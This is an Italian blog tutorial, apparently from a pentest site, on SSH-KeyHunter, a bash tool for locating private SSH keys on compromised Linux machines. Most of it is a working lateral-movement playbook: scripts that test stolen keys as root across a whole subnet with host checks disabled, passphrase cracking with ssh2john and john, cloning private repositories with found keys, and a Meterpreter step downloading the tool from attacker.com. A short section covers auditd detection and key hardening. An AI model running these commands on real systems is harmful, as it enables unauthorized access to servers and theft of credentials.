---
title: 'SSH-KeyHunter: trovare chiavi SSH private e pivotare su Linux'
slug: ssh-keyhunter
description: >-
  SSH-KeyHunter automatizza la ricerca di chiavi SSH private su Linux, individua
  file non protetti, owner, fingerprint e target da known_hosts: tool ideale per
  post-exploitation e lateral movement in pentest autorizzati.
image: /ssh-keyhunter.webp
draft: false
date: 2026-03-31T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - ssh-keys
  - lateral-movement
---

SSH-KeyHunter è uno script bash che automatizza la ricerca di **chiavi SSH private** su filesystem Linux. Invece di cercare manualmente in `~/.ssh/` di ogni utente, SSH-KeyHunter scansiona l'intero filesystem, identifica chiavi private (id\_rsa, id\_ed25519, etc.), e tenta di determinare dove possono essere usate per lateral movement.

Il problema nel post-exploitation Linux è che chiavi SSH sono ovunque: home directories, backup folders, mounted shares, script repositories. Administrators spesso lasciano chiavi private in location non-standard (development directories, `/opt`, `/var`). SSH-KeyHunter trova tutte queste chiavi in una scansione automatica.

Oltre a trovare chiavi, SSH-KeyHunter tenta di:

* Identificare l'utente owner della chiave
* Testare se chiave è protetta da passphrase
* Estrarre fingerprint per correlation
* Suggerire possibili target host (da `.ssh/known_hosts`)

Il tool è particolarmente potente in ambienti enterprise dove:

* Multipli sysadmin condividono server
* Deployment automation usa SSH keys
* Git repositories hanno deploy keys
* Backup scripts usano passwordless SSH

In questo articolo imparerai come usare SSH-KeyHunter efficacemente, interpretare output, testare chiavi trovate su target hosts, e automation di lateral movement. Vedrai scenari reali dove una singola chiave SSH trovata apre accesso a decine di server enterprise.

***

## 1️⃣ Cos'è SSH-KeyHunter

### Cosa fa

SSH-KeyHunter:

1. **Scansiona filesystem** per file che sembrano chiavi SSH private
2. **Identifica tipo chiave** (RSA, DSA, ECDSA, Ed25519)
3. **Testa passphrase protection** (chiave encrypted o no)
4. **Estrae metadata** (fingerprint, comment)
5. **Cerca known\_hosts** per identificare possibili target
6. **Output report** con chiavi trovate e suggested exploitation

***

### Installation

```bash
# Clone repository
git clone https://github.com/jtesta/ssh-keyHunter.git
cd ssh-keyHunter

# O download diretto
wget https://raw.githubusercontent.com/jtesta/ssh-keyHunter/master/ssh-keyhunter.sh
chmod +x ssh-keyhunter.sh
```

**Dependencies:** Standard Unix tools (find, grep, ssh-keygen)

***

## 2️⃣ Uso Base

### Scan completo

```bash
./ssh-keyhunter.sh
```

**Output esempio:**

```
[*] SSH KeyHunter - Scanning for SSH private keys...
[*] Searching in: /home /root /opt /var

[+] FOUND: /home/john/.ssh/id_rsa
    Type: RSA 2048-bit
    Fingerprint: SHA256:abc123...
    Passphrase: NONE (unencrypted!)
    Owner: john:john
    
[+] FOUND: /home/john/.ssh/backup_key
    Type: RSA 4096-bit
    Fingerprint: SHA256:def456...
    Passphrase: PROTECTED
    Owner: john:john

[+] FOUND: /opt/deploy/.ssh/deploy_key
    Type: Ed25519
    Fingerprint: SHA256:ghi789...
    Passphrase: NONE
    Owner: root:root

[+] FOUND: /var/backups/keys/legacy_key
    Type: RSA 1024-bit (WEAK!)
    Fingerprint: SHA256:jkl012...
    Passphrase: NONE
    Owner: backup:backup

[*] Scanning known_hosts files...
[+] /home/john/.ssh/known_hosts suggests connections to:
    - server01.company.com
    - server02.company.com
    - db-prod.internal.local

[*] SUMMARY
Total keys found: 4
Unencrypted keys: 3
Weak keys: 1
Suggested targets: 3 hosts
```

🎓 **Priority:**

1. **Unencrypted keys** (immediate use)
2. **Keys owned by root** (highest privilege)
3. **Weak keys** (RSA \<2048 bit, DSA)
4. **Known\_hosts** (tells you where to try keys)

***

### Scan directory specifica

```bash
# Solo /home
./ssh-keyhunter.sh /home

# Multiple directories
./ssh-keyhunter.sh /home /opt /var
```

***

### Output options

```bash
# Save to file
./ssh-keyhunter.sh > keys_found.txt

# Verbose mode
./ssh-keyhunter.sh -v

# Quiet (solo chiavi trovate)
./ssh-keyhunter.sh -q
```

***

## 3️⃣ Testing Chiavi Trovate

### Test manuale SSH key

```bash
# Chiave trovata: /home/john/.ssh/id_rsa
# Known_hosts suggerisce: server01.company.com

# Test connection
ssh -i /home/john/.ssh/id_rsa john@server01.company.com

# Se funziona
john@server01:~$ whoami
john
```

***

### Automated testing

```bash
# Script per test batch
cat > test_keys.sh << 'EOF'
#!/bin/bash
KEY=$1
HOSTS=$2

for host in $(cat $HOSTS); do
  echo "[*] Testing $KEY on $host"
  timeout 5 ssh -o StrictHostKeyChecking=no -o BatchMode=yes -i $KEY root@$host "whoami" 2>/dev/null
  if [ $? -eq 0 ]; then
    echo "[+] SUCCESS: $KEY works on $host as root!"
  fi
done
EOF

chmod +x test_keys.sh

# Usage
./test_keys.sh /home/john/.ssh/id_rsa targets.txt
```

***

### Extracting known\_hosts

```bash
# Parse known_hosts per lista host
cat /home/john/.ssh/known_hosts | awk '{print $1}' | sort -u > potential_targets.txt

# Test key su ogni host
for host in $(cat potential_targets.txt); do
  ssh -i /home/john/.ssh/id_rsa -o ConnectTimeout=3 john@$host "hostname" 2>/dev/null && echo "[+] $host accessible!"
done
```

***

## 4️⃣ Scenari Pratici

### Scenario A: Web server → Database access

**Contesto:** Compromised web server come `www-data`.

```bash
# SSH-KeyHunter scan
./ssh-keyhunter.sh /var/www
```

**Output:**

```
[+] FOUND: /var/www/html/deployment/.ssh/deploy_key
    Type: RSA 4096-bit
    Passphrase: NONE
    
[+] known_hosts suggests:
    - db01.internal.local
    - db02.internal.local
```

**Exploitation:**

```bash
# Test su database server
ssh -i /var/www/html/deployment/.ssh/deploy_key deploy@db01.internal.local

deploy@db01:~$ mysql -u root -p
# [ha accesso DB production!]
```

**Timeline:** 3 minuti da web compromise a database access

***

### Scenario B: Backup server → Full infrastructure

**Contesto:** Compromised backup server (utente `backup`).

```bash
./ssh-keyhunter.sh /
```

**Output:**

```
[+] FOUND: /root/.ssh/id_rsa (ROOT KEY!)
    Passphrase: NONE
    
[+] FOUND: /var/backups/ssh-keys/ansible_key
    Passphrase: NONE
    Comment: ansible@automation
```

🎓 **Root key** = Probabilmente ha accesso passwordless a MOLTI server per backup automation.

**Exploitation:**

```bash
# Test root key su subnet
for i in {1..254}; do
  (timeout 2 ssh -o StrictHostKeyChecking=no -i /root/.ssh/id_rsa root@10.10.10.$i "hostname" 2>/dev/null && echo "[+] 10.10.10.$i") &
done | grep "\[+\]"
```

**Risultato:**

```
[+] 10.10.10.5 = web01
[+] 10.10.10.10 = db-prod  
[+] 10.10.10.15 = mail01
[+] 10.10.10.20 = dc01
[... 20+ server accessibili]
```

**Una chiave = accesso a 20+ server!**

Per approfondire automation di lateral movement, consulta [scripting per automated lateral movement in Linux](https://hackita.it/articoli/linux-lateral-movement-automation).

***

### Scenario C: Developer workstation → Git infrastructure

**Contesto:** Compromised developer laptop.

```bash
./ssh-keyhunter.sh /home/dev
```

**Output:**

```
[+] FOUND: /home/dev/.ssh/id_rsa
    Comment: dev@laptop
    
[+] FOUND: /home/dev/projects/client1/.ssh/deploy_key
    Comment: deploy@gitlab.client1.com
    
[+] FOUND: /home/dev/.ssh/github_key
    Comment: dev@github.com
```

**Exploitation:**

```bash
# Test GitHub access
GIT_SSH_COMMAND="ssh -i /home/dev/.ssh/github_key" git clone git@github.com:company/secrets.git

# Access internal GitLab
ssh -i /home/dev/projects/client1/.ssh/deploy_key git@gitlab.client1.com
# Shell on GitLab server!
```

***

## 5️⃣ Advanced Techniques

### Cracking passphrase-protected keys

Se chiave è encrypted, usa `ssh2john` + `john`.

```bash
# Chiave trovata: /home/john/.ssh/id_rsa (PROTECTED)

# Convert per john
ssh2john /home/john/.ssh/id_rsa > hash.txt

# Crack
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Output:
# password123      (/home/john/.ssh/id_rsa)

# Usa chiave
ssh-add /home/john/.ssh/id_rsa
# Enter passphrase: password123

ssh john@target
# Accesso senza re-enter passphrase
```

***

O in alternativa nache hashcat, e si abbiamo entrambi gli articoli, clicca [qui per hashcat ](https://hackita.it/articoli/hashcat)e [qui per john the ripper.](https://hackita.it/articoli/john-the-ripper)

### Key correlation (matching keys to hosts)

```bash
# Script per correlation
for key in /home/*/.ssh/id_*; do
  [ -f "$key" ] || continue
  echo "[*] Testing key: $key"
  
  FINGERPRINT=$(ssh-keygen -lf $key 2>/dev/null | awk '{print $2}')
  
  # Cerca questo fingerprint in authorized_keys di altri server
  # (richiede access agli altri server)
  for host in $(cat known_servers.txt); do
    ssh user@$host "grep -r $FINGERPRINT ~/.ssh/authorized_keys" 2>/dev/null && echo "[+] $key matches authorized_keys on $host"
  done
done
```

***

### Integration con Metasploit

Leggi anche la nostra guida su metasploit, e si. Abbiamo pensato proprio a tutto 

```bash
# Meterpreter session
meterpreter > shell

# Download SSH-KeyHunter
wget http://attacker.com/ssh-keyhunter.sh
chmod +x ssh-keyhunter.sh
./ssh-keyhunter.sh > keys.txt

# Download keys trovate
meterpreter > download /home/john/.ssh/id_rsa

# Test lateralmente da tua macchina
ssh -i id_rsa john@<next-target>
```

***

## 6️⃣ Detection & Defense

### Cosa detecta Blue Team

**File access monitoring:**

```bash
# auditd rule
-w /home/*/.ssh/ -p r -k ssh_key_access
-w /root/.ssh/ -p r -k ssh_key_access
```

**Behavioral indicators:**

```
- Processo web (apache, nginx) accede .ssh directories
- find command con pattern "id_rsa|id_dsa|id_ecdsa"
- ssh-keygen execution da utente non-admin
- Massive SSH connection attempts (key testing)
```

***

### Defense: Hardening SSH keys

**1. Passphrase protection:**

```bash
# Sempre usa passphrase per chiavi private
ssh-keygen -t ed25519 -C "user@host"
# Enter passphrase: [strong-passphrase]
```

**2. File permissions:**

```bash
# Chiavi private devono essere 600
chmod 600 ~/.ssh/id_rsa
chmod 700 ~/.ssh

# Verify
ls -la ~/.ssh/
# -rw------- id_rsa  ← Correct
```

**3. Certificate-based auth (advanced):**

```bash
# Usa SSH certificates invece di keys
# Richiede SSH CA infrastructure
```

**4. Restrict key usage:**

```bash
# In authorized_keys, limita comando:
command="/usr/local/bin/backup.sh",no-port-forwarding,no-x11-forwarding ssh-rsa AAAAB3...
```

Per approfondire SSH hardening, leggi [best practices per SSH security in enterprise](https://hackita.it/articoli/ssh-security-hardening).

***

## 7️⃣ Troubleshooting

### SSH-KeyHunter non trova chiavi esistenti

**Causa:** Chiavi in location non-standard con nomi custom.

**Fix:**

```bash
# Manual find con pattern esteso
find / -type f -name "*key*" -o -name "*rsa*" -o -name "*dsa*" 2>/dev/null | while read file; do
  head -1 "$file" | grep -q "BEGIN.*PRIVATE KEY" && echo "[+] $file"
done
```

***

### "Permission denied" su molte directory

**Causa:** Running come non-root.

**Fix:**

```bash
# Scan solo directory accessible
find ~ -name "id_*" -type f 2>/dev/null

# O con sudo
sudo ./ssh-keyhunter.sh
```

***

### Key trovata ma SSH connection fallisce

**Causa 1:** Key non corrisponde a authorized\_keys su target.

**Causa 2:** SSH config su target richiede specifiche (port, user, etc).

**Fix:**

```bash
# Verbose SSH per debug
ssh -v -i key user@host

# Testa different users
for user in root admin user ubuntu ec2-user; do
  ssh -i key -o ConnectTimeout=3 $user@host && echo "[+] Works with user: $user"
done
```

***

## 8️⃣ Alternatives

| **Tool**          | **Focus**     | **Automation** | **Testing** |
| ----------------- | ------------- | -------------- | ----------- |
| **SSH-KeyHunter** | Discovery     | ✅ Yes          | ⚠️ Manual   |
| **find + grep**   | Manual search | ❌ No           | ❌ No        |
| **LinPEAS**       | General enum  | ⚠️ Partial     | ❌ No        |
| **Custom script** | Tailored      | ✅ Yes          | ✅ Yes       |

**SSH-KeyHunter vantaggio:** Automatizza discovery + identifica target hosts via known\_hosts.

***

## 9️⃣ FAQ

**Q: SSH-KeyHunter funziona su Windows?**

A: **No**. Windows usa different SSH implementation (PuTTY format .ppk). Per Windows usa `PuttyKeyExtractor`.

**Q: Può trovare chiavi in encrypted home directories?**

A: **No**. Se home directory è encrypted e non montata, chiavi non accessibili.

**Q: Quanto è common trovare unencrypted SSH keys?**

A: **Molto comune**. \~60-70% chiavi in enterprise non hanno passphrase (convenienza > security).

**Q: SSH-KeyHunter exfiltrata chiavi?**

A: **No**. Solo trova e reporta. Exfiltration è tua responsabilità (e deve essere autorizzata).

**Q: È detection rate alto?**

A: **Basso-medio**. È bash script che usa find/grep standard. Behavioral detection (massive .ssh access) è più probabile che signature-based.

***

## 10️⃣ Cheat Sheet

| **Task**                 | **Command**                                          |
| ------------------------ | ---------------------------------------------------- |
| **Full scan**            | `./ssh-keyhunter.sh`                                 |
| **Specific directory**   | `./ssh-keyhunter.sh /home`                           |
| **Save output**          | `./ssh-keyhunter.sh > keys.txt`                      |
| **Test key**             | `ssh -i /path/to/key user@host`                      |
| **Batch test**           | `for h in $(cat hosts); do ssh -i key user@$h; done` |
| **Extract known\_hosts** | `cat ~/.ssh/known_hosts \| awk '{print $1}'`         |
| **Crack passphrase**     | `ssh2john key > hash; john hash`                     |

***

## Disclaimer

SSH-KeyHunter è tool per **security research e penetration testing autorizzato**. Accesso a chiavi SSH altrui e uso per lateral movement senza autorizzazione è illegale (unauthorized access, privacy violations). Usa solo in:

* Lab personali
* Pentest con contratto firmato
* Con consenso esplicito proprietario sistemi

**Repository:** [https://github.com/jtesta/ssh-keyHunter](https://github.com/jtesta/ssh-keyHunter)

***

Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
